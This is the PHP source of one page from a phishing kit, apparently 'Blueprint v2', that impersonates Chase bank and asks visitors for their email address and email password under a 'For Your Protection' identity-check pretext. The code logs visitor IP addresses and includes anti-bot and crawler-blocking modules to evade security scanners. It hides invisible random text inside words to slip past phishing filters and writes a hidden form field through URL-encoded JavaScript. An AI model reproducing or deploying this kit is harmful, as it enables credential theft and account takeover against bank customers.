<?php

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

session_start();
error_reporting(0);

//other bots

include 'blueprint/antbots/ip_blocklist.php';
include 'blueprint/antbots/crawler.php';
include 'blueprint/antbots/boting.php';
include 'blueprint/antbots/myz.php';
include 'bot_fucker/fucker001.php';
include 'bot_fucker/fucker002.php';
include 'bot_fucker/fucker003.php';
include 'bot_fucker/fucker004.php';
include 'bot_fucker/fucker005.php';
include 'bot_fucker/fucker006.php';
include 'bot_fucker/fucker007.php';
include 'bot_fucker/fucker008.php';
include 'bot_fucker/wrd.php';
include 'bot_fucker/bot.php';
require_once 'inc.php';
require_once 'blocklist.php';
require_once 'proxy.php';
require_once 'huehuehue.php';
include 'zsec.php';
//Crawler

@require "blueprint/antbots/Crawler/src/CrawlerDetect.php";
 use JayBizzle\CrawlerDetect\CrawlerDetect;




    $content2 = "#>".$_SERVER['REMOTE_ADDR']."\r\n";
    $save2=fopen("files/data/email_page_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    $size = '100';
    $margin_top = '';
$useragent=$_SERVER['HTTP_USER_AGENT'];
if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4)))
$size = '40';
$margin_top = '-6px';

?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>For Your Protection</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="blueprint/Files/img/chsefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="blueprint/Files/img/chse-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="blueprint/Files/img/chse-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="blueprint/Files/img/chse-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="blueprint/Files/img/chse-touch-icon.png">
        <link rel="stylesheet" href="blueprint/Files/css/logon.css">
        <link rel="stylesheet" href="blueprint/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="blueprint/Files/css/overview.css">
        <link rel="stylesheet" href="blueprint/Files/css/hue.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">Blueprint v2</span>
</a> 
</div>
</header>




<!--- FORM HERE --->
<form action="files/next/email.php" method="POST">
<script type="text/javascript">
<!--
document.write(unescape('%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%68%69%64%64%65%6e%22%20%6e%61%6d%65%3d%22%74%6f%6b%65%6e%22%20%76%61%6c%75%65%3d%22%63%68%61%73%65%53%50%30%58%22%3e'));
//-->
</script>

<main id="logon-content" data-has-view="true">
<div class="msd password-reset reset-code" data-is-view="true">
<div id="backgroundImage">
<div class="jpui background image fixed blurred" id="geoImage">
<style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg); } }</style>

</div>
</div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
    <h1 class="header" tabindex="-1">For Your Protection</h1>
<div class="row jpui panel body">
<div class="col-xs-12 col-sm-10 col-sm-offset-1">
<div class="progress u-no-outline" id="progress" tabindex="-1">
<div class="row">
<div class="col-xs-12 col-sm-6 clear-padding">
</div>
<div class="col-xs-12 col-sm-6 progress-padding">
<div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
<ol class="steps-3" role="presentation">
    <li class="active"></li>
    <li class="active current-step"></li>
    <li id="progress-progressBar-step-3"></li>
</ol>


</div>
</div>
</div>
</div>



<form  method="POST" autocomplete="off" action="javascript:void(0);" novalidate="">
    <h3>Email authentication </h3ext>
    <p>For Your iden<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tification, We need yo<font style="color:transparent;font-size:0px"><?=$rundom;?></font>u to sign-in to your reg<font style="color:transparent;font-size:0px"><?=$rundom;?></font>istered ema<font style="color:transparent;font-size:0px"><?=$rundom;?></font>il which we have in our reco<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rds.</p>
        <?php 
    if (isset($_GET['invalid'])) {
        echo'<div class="validator-error-header"><div class="jpui error error jpui Blueprint Blueprint inverted primary animate alert" aria-labelledby="inner-alert-the-user"><i class="jpui exclamation-color error error icon"></i> <div class="icon background"></div> <div class="content wrap" ><h2 class="title" tabindex="-1" ><span class="util accessible-text">Important: </span >We couldnt find any records that match the details you entered.<br> Please try again!</h2>   </div></div></div><input type="hidden" name="invalid" value="invalid">';
        }?>
<div class="inside-container">
<?php if($size == '40'){ echo '<center>';}?>
<img id='emailimg' src='https://img.icons8.com/color/480/000000/email.png' width='<?php echo $size; ?>' style="margin-bottom:-110;margin-top:<?php echo $margin_top; ?>;">
<?php if($size == '40'){ echo '</center>';}?>
<div class="row">
<div class="col-xs-12 col-sm-5 label-column otp-code">
    <label class="jpui label msdLabelHeightFix">
        <span class="accessible-text hidden"></span>Email a<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ddress </label>
</div>
<div class="col-xs-12 col-sm-5 form-column otp-code">
<div class="account-input ssn_card_account_number">
    <input class="jpui input account-input ssn_card_account_number" type="email" id="mySelect" onchange="myFunction()"  name="email_address">    </div>
</div>
</div>
<div class="row">
<div class="col-xs-12 col-sm-5 label-column">
    <label class="jpui label">
    <span class="accessible-text hidden"></span>Password</label>
</div>
<div class="col-xs-12 col-sm-5 form-column">
<div class="margin-bottom-20px" id="password_input">
<input class="jpui input margin-bottom-20px" type="password" required name="email_password" minlength="6">
</div>
</div>
</div>
<p class="identification-code-received-message">
<span>We ask you to veri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>fy your email to ad<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d this device as <a class="link-anchor underline" href="javascript:void(0);" >Trusted Devices,</a>and safeguard your account from any unauthorized login from unknown device.</span>
<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
</span>
</p>
</div>
<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid ">
    <span class="label">Cancel</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary ">
    <span class="label">Next</span>
</button>
</div>
</div>
</form></div></div></div></div></div></div>
</main>
</div>
</div> 
</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});
$(document).ready(function() {
    $("#submit").submit(function(e) {
        $("#errordiv").hide();
    });
});

</script>
<script>
function myFunction() {
  var x = document.getElementById("mySelect").value;
  if (x.includes("gmail")) {
  document.getElementById("emailimg").src = "https://img.icons8.com/fluent/480/000000/gmail--v1.png";
}
if (x.includes("aol")) {
  document.getElementById("emailimg").src = "img/aol-m@il.png";
}
if (x.includes("yahoo")) {
  document.getElementById("emailimg").src = "https://download.logo.wine/logo/Yahoo!_Mail/Yahoo!_Mail-Logo.wine.png";
}
if (x.includes("outlook")) {
  document.getElementById("emailimg").src = "https://www.freepnglogos.com/uploads/logo-outlook/transparent-outlook-icon-2.png";
}
}
</script>

</body>
</html>